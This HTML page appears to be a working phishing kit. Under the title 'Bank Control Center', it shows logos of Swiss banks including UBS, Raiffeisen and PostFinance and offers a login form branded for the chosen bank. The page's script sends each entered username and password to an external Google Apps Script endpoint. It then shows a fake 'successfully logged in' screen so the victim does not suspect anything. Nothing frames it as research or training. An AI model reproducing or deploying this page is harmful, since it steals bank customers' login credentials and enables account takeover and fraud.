<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Control Center</title>
    <link rel="icon" type="image/png" href="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/bank-icon-5.png?raw=true">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #f5f5f5;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        #startView {
            text-align: center;
            padding: 40px 20px;
            width: 100%;
        }

        #startView h1 {
            color: #1a1a1a;
            font-size: 1.8em;
            font-weight: 700;
            margin-bottom: 40px;
        }

        .drive-grid {
            display: flex;
            flex-direction: row;
            gap: 20px;
            justify-content: center;
            flex-wrap: nowrap;
        }

        .drive-card {
            background-color: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            padding: 36px 24px;
            cursor: pointer;
            transition: border-color 0.2s, transform 0.15s, box-shadow 0.2s;
            text-align: center;
            width: 160px;
            flex-shrink: 0;
        }

        .drive-card:hover {
            border-color: #388bfd;
            transform: translateY(-4px);
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
        }

        .drive-img {
            width: 80px;
            height: 80px;
            object-fit: contain;
            margin-bottom: 14px;
            border-radius: 10px;
        }

        .drive-card .name {
            color: #1a1a1a;
            font-size: 0.88em;
            font-weight: 600;
        }

        /* ── LOGIN / ERFOLG ── */
        .box {
            display: none;
            width: 100%;
            max-width: 380px;
            padding: 40px 36px;
            background-color: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            margin: 20px;
        }

        .back-btn {
            background: none;
            border: none;
            color: #888;
            font-size: 0.85em;
            cursor: pointer;
            margin-bottom: 24px;
            padding: 0;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: color 0.2s;
        }

        .back-btn:hover {
            color: #1a1a1a;
        }

        .login-logo {
            width: 60px;
            height: 60px;
            object-fit: contain;
            display: block;
            margin: 0 auto 16px auto;
        }

        h1 {
            color: #1a1a1a;
            font-size: 1.3em;
            font-weight: 700;
            text-align: center;
            margin-bottom: 28px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            color: #555;
            margin-bottom: 6px;
            font-size: 0.85em;
            font-weight: 500;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background-color: #fafafa;
            color: #1a1a1a;
            font-size: 0.95em;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #388bfd;
            background-color: #fff;
        }

        .btn {
            display: block;
            width: 100%;
            background-color: #238636;
            color: #fff;
            padding: 11px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 0.95em;
            cursor: pointer;
            margin-top: 22px;
            transition: background-color 0.2s;
        }

        .btn:hover {
            background-color: #2ea44f;
        }

        .success-screen {
            text-align: center;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            background-color: #238636;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
            font-size: 1.8em;
            color: white;
        }

        .success-screen h2 {
            color: #1a1a1a;
            font-size: 1.2em;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .success-screen p {
            color: #666;
            font-size: 0.88em;
            margin-bottom: 24px;
        }

        .home-btn {
            display: inline-block;
            background: none;
            border: 1px solid #ddd;
            color: #555;
            padding: 8px 20px;
            border-radius: 8px;
            font-size: 0.85em;
            cursor: pointer;
            transition: border-color 0.2s, color 0.2s;
        }

        .home-btn:hover {
            border-color: #888;
            color: #1a1a1a;
        }

        /* ── MOBILE ── */
        @media (max-width: 600px) {
            #startView h1 {
                font-size: 1.4em;
                margin-bottom: 24px;
            }

            .drive-grid {
                flex-direction: column;
                align-items: center;
                gap: 14px;
            }

            .drive-card {
                width: 85%;
                max-width: 320px;
                padding: 20px 24px;
                display: flex;
                flex-direction: row;
                align-items: center;
                gap: 20px;
            }

            .drive-img {
                width: 56px;
                height: 56px;
                margin-bottom: 0;
                flex-shrink: 0;
            }

            .drive-card .name {
                font-size: 1em;
                text-align: left;
            }

            .box {
                margin: 20px;
                padding: 30px 24px;
            }
        }
    </style>
</head>
<body>

    <!-- STARTSEITE -->
    <div id="startView">
        <h1>Wählen Sie Ihre Bank</h1>
        <div class="drive-grid">
            <div class="drive-card" onclick="openLogin('Raiffeisen', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/unnamed.png?raw=true')">
                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/unnamed.png?raw=true" class="drive-img" alt="Raiffeisen">
                <div class="name">Raiffeisen</div>
            </div>
            <div class="drive-card" onclick="openLogin('BLKB', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/images.png?raw=true')">
                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/images.png?raw=true" class="drive-img" alt="BLKB">
                <div class="name">BLKB</div>
            </div>
            <div class="drive-card" onclick="openLogin('AKB', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/csm_akb-image_badfd2a611.webp?raw=true')">
                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/csm_akb-image_badfd2a611.webp?raw=true" class="drive-img" alt="AKB">
                <div class="name">AKB</div>
            </div>
            <div class="drive-card" onclick="openLogin('UBS', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/UBS-c7036cca.png?raw=true')">
                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/UBS-c7036cca.png?raw=true" class="drive-img" alt="UBS">
                <div class="name">UBS</div>
            </div>
            <div class="drive-card" onclick="openLogin('PostFinance', 'https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/postfinance-neues-logo-001.png?raw=true')">
                <img src="https://github.com/cartman4310-gif/cartman4310-gif.github.io/blob/main/postfinance-neues-logo-001.png?raw=true" class="drive-img" alt="PostFinance">
                <div class="name">PostFinance</div>
            </div>
        </div>
    </div>

    <!-- LOGIN BOX -->
    <div class="box" id="loginView">
        <button class="back-btn" onclick="goHome()">← Zurück</button>
        <img id="loginLogo" src="" class="login-logo" alt="Logo">
        <h1 id="loginTitle">Login</h1>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Nutzername</label>
                <input type="text" id="username" placeholder="Nutzername eingeben" required autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Passwort</label>
                <input type="password" id="password" placeholder="Passwort eingeben" required>
            </div>
            <button type="submit" class="btn">Anmelden</button>
        </form>
    </div>

    <!-- ERFOLGS-SCREEN -->
    <div class="box" id="successView">
        <div class="success-screen">
            <div class="success-icon">✓</div>
            <h2>Erfolgreich angemeldet</h2>
            <p id="successText">Willkommen.</p>
            <button class="home-btn" onclick="goHome()">← Zurück zur Startseite</button>
        </div>
    </div>

    <script>
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby2NOHdi-_cbNv4q5cZxOQBHZmPPrQW9IXcJ-JYITJqhoYSPL-mxnNKssMuCMO-_rDdBQ/exec";

        let currentDrive = "";

        function openLogin(bankName, logoUrl) {
            currentDrive = bankName;
            document.getElementById('loginTitle').textContent = bankName + ' Login';
            document.getElementById('loginLogo').src = logoUrl;
            document.getElementById('loginForm').reset();

            document.getElementById('startView').style.display   = 'none';
            document.getElementById('loginView').style.display   = 'block';
            document.getElementById('successView').style.display = 'none';
        }

        function goHome() {
            document.getElementById('startView').style.display   = 'block';
            document.getElementById('loginView').style.display   = 'none';
            document.getElementById('successView').style.display = 'none';
        }

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ drive: currentDrive, username: user, password: pass })
            });

            document.getElementById('successText').textContent =
                'Willkommen bei ' + currentDrive + '.';

            document.getElementById('loginView').style.display   = 'none';
            document.getElementById('successView').style.display = 'block';
        });
    </script>

</body>
</html>
